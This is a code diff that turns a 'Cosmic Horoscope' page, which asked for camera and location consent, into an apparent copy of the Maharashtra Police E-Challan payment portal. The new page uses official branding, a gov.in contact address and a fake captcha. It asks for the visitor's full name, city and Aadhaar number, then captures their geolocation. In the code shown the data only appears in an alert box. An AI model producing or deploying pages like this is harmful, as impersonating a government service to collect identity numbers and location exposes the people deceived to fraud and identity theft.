@@ -1,32 +1,350 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>Cosmic Horoscope</title>
-  <link rel="stylesheet" href="/static/style.css">
-</head>
-<body>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>E-Challan Payment Maharashtra State</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: Verdana, sans-serif;
+        background: #f5f5f5;
+      }
+      .header {
+        background: #000bb7;
+        padding: 10px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .header-logo {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+      .logo-img {
+        width: 100px;
+      }
+      .header-text {
+        color: #fff;
+        font-size: 17px;
+      }
+      .language {
+        color: #fff;
+      }
+      #langSelect {
+        background: #fff;
+        color: #000;
+        border: 1px solid #ddd;
+        padding: 8px 12px;
+        border-radius: 4px;
+        font-size: 14px;
+        cursor: pointer;
+        font-family: Verdana, sans-serif;
+      }
+      .nav {
+        background: #000bb7;
+        padding: 10px;
+        text-align: center;
+      }
+      .nav a {
+        color: #fff;
+        text-decoration: none;
+        margin: 0 15px;
+        font-size: 16px;
+      }
+      .nav a:hover {
+        opacity: 0.8;
+      }
+      .container {
+        max-width: 500px;
+        margin: 50px auto;
+        padding: 0 20px;
+      }
+      h4 {
+        margin-bottom: 25px;
+        color: #333;
+        font-size: 18px;
+      }
+      .form-group {
+        margin-bottom: 20px;
+      }
+      input[type="text"] {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 3px;
+        font-size: 14px;
+        background: #fff;
+      }
+      input[type="text"]:focus {
+        outline: none;
+        border-color: #000bb7;
+      }
+      .captcha-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+      .captcha-img {
+        width: 150px;
+        height: 36px;
+        background: #e0e0e0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: monospace;
+        letter-spacing: 3px;
+        font-size: 18px;
+      }
+      .captcha-input {
+        flex: 1;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 3px;
+        background: #fff;
+      }
+      .refresh-icon {
+        color: #000bb7;
+        font-size: 24px;
+        cursor: pointer;
+      }
+      .submit-btn {
+        width: 100%;
+        background: #000bb7;
+        color: #fff;
+        border: none;
+        padding: 12px;
+        border-radius: 3px;
+        font-size: 16px;
+        cursor: pointer;
+        font-family: Verdana;
+      }
+      .submit-btn:hover {
+        background: #3f51b5;
+      }
+      .links {
+        margin-top: 15px;
+        font-size: 13px;
+      }
+      .links a {
+        color: #000bb7;
+        text-decoration: none;
+        display: block;
+        margin-bottom: 8px;
+      }
+      .links a:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        background: #a6a6a6;
+        padding: 20px;
+        text-align: center;
+        margin-top: 50px;
+      }
+      .footer-bottom {
+        background: #000;
+        color: #fff;
+        padding: 10px;
+        text-align: center;
+        font-size: 13px;
+      }
+      .error {
+        color: red;
+        font-size: 12px;
+        margin-top: 5px;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="header-logo">
+        <img src="mh_logo.png" alt="Maharashtra Police Logo" class="logo-img" />
+        <p class="header-text">E-Challan Payment<br />Maharashtra Police</p>
+      </div>
+      <div class="language">
+        <select id="langSelect">
+          <option>English</option>
+          <option>मराठी</option>
+        </select>
+      </div>
+    </div>
 
-<div class="card">
-  <h1>Cosmic Horoscope</h1>
+    <div class="container">
+      <h4>E-Challan Payment Maharashtra State</h4>
 
-  <input type="text" id="name" placeholder="Your Name">
-  <input type="text" id="city" placeholder="Your City">
-  
-  <label>Date of Birth</label>
-  <input type="date" id="dob">
+      <form id="challanForm">
+        <div class="form-group">
+          <input type="text" id="nameInput" placeholder="Enter Full Name" />
+          <span class="error" id="nameError">Please enter your name</span>
+        </div>
 
-  <button onclick="start()">Reveal My Horoscope</button>
+        <div class="form-group">
+          <input type="text" id="cityInput" placeholder="Enter City" />
+          <span class="error" id="cityError">Please enter your city</span>
+        </div>
 
-  <p class="consent">
-    By continuing, you consent to camera & location access for verification.
-  </p>
+        <div class="form-group">
+          <input
+            type="text"
+            id="aadharInput"
+            placeholder="Enter Aadhar Number"
+            maxlength="12"
+          />
+          <span class="error" id="aadharError"
+            >Please enter valid 12-digit Aadhar number</span
+          >
+        </div>
 
-  <div id="result"></div>
-</div>
+        <div class="captcha-row">
+          <img class="captcha-img" id="captchaImg" src="" alt="Captcha" />
+          <input
+            type="text"
+            class="captcha-input"
+            id="captchaInput"
+            placeholder="Enter code"
+            maxlength="8"
+          />
+          <span class="refresh-icon" onclick="refreshCaptcha()">↻</span>
+        </div>
+        <span class="error" id="captchaError">Please enter above code</span>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+        <button type="submit" class="submit-btn">Submit</button>
 
-<script src="/static/script.js"></script>
-</body>
+        <div class="links">
+          <a href="#"
+            >Click here to link/unlink mobile number to your vehicle number</a
+          >
+          <a href="#"
+            >Click here to raise a grievance for wrongly booked challan or any
+            payment issue</a
+          >
+        </div>
+      </form>
+    </div>
+
+    <div class="footer">
+      <div style="color: #fff; margin-bottom: 10px">
+        <strong>Operated By:</strong> Maharashtra State<br />
+        <strong>Contact:</strong> support@mahatraffic.gov.in
+      </div>
+      <div style="margin-top: 15px">
+        <img
+          src="/templates/app_store-sm.png"
+          alt="App Store"
+          style="margin: 0 5px"
+        />
+        <img
+          src="/templates/play_store-sm.png"
+          alt="Google Play"
+          style="margin: 0 5px"
+        />
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      © 2024 Maharashtra Police. All rights reserved.
+    </div>
+
+    <script>
+      // Define captcha images and their corresponding answers
+      const captchaData = [
+        { image: "/templates/captcha/1.png", answer: "ABC123XY" },
+        { image: "/templates/captcha/2.png", answer: "ZX9K4LMN" },
+        { image: "/templates/captcha/3.png", answer: "QW7ER2TY" },
+        { image: "/templates/captcha/4.png", answer: "PL8MN3KO" },
+      ];
+
+      let currentCaptcha = null;
+
+      function refreshCaptcha() {
+        const randomIndex = Math.floor(Math.random() * captchaData.length);
+        currentCaptcha = captchaData[randomIndex];
+        document.getElementById("captchaImg").src = currentCaptcha.image;
+        document.getElementById("captchaInput").value = ""; // Clear input
+      }
+
+      // Call this when validating the form
+      function validateCaptcha() {
+        const userInput = document.getElementById("captchaInput").value;
+        if (userInput === currentCaptcha.answer) {
+          return true;
+        } else {
+          document.getElementById("captchaError").style.display = "block";
+          return false;
+        }
+      }
+
+      // Initialize captcha on page load
+      refreshCaptcha();
+
+      document
+        .getElementById("challanForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          let valid = true;
+
+          document
+            .querySelectorAll(".error")
+            .forEach((el) => (el.style.display = "none"));
+
+          const name = document.getElementById("nameInput").value.trim();
+          const city = document.getElementById("cityInput").value.trim();
+          const aadhar = document.getElementById("aadharInput").value.trim();
+          const captchaInput = document
+            .getElementById("captchaInput")
+            .value.trim();
+
+          if (!name) {
+            document.getElementById("nameError").style.display = "block";
+            valid = false;
+          }
+
+          if (!city) {
+            document.getElementById("cityError").style.display = "block";
+            valid = false;
+          }
+
+          if (!aadhar || aadhar.length !== 12 || !/^\d+$/.test(aadhar)) {
+            document.getElementById("aadharError").style.display = "block";
+            valid = false;
+          }
+
+          if (!captchaInput) {
+            document.getElementById("captchaError").style.display = "block";
+            valid = false;
+          }
+
+          if (valid) {
+            // Get user location
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  const lat = position.coords.latitude;
+                  const lon = position.coords.longitude;
+                  alert(
+                    `Form submitted successfully!\n\nName: ${name}\nCity: ${city}\nAadhar: ${aadhar}\n\nLocation captured:\nLatitude: ${lat}\nLongitude: ${lon}`
+                  );
+                },
+                function (error) {
+                  alert(
+                    `Form submitted successfully!\n\nName: ${name}\nCity: ${city}\nAadhar: ${aadhar}\n\nLocation access denied: ${error.message}`
+                  );
+                }
+              );
+            } else {
+              alert(
+                `Form submitted successfully!\n\nName: ${name}\nCity: ${city}\nAadhar: ${aadhar}\n\nGeolocation not supported by browser`
+              );
+            }
+          }
+        });
+    </script>
+  </body>
 </html>
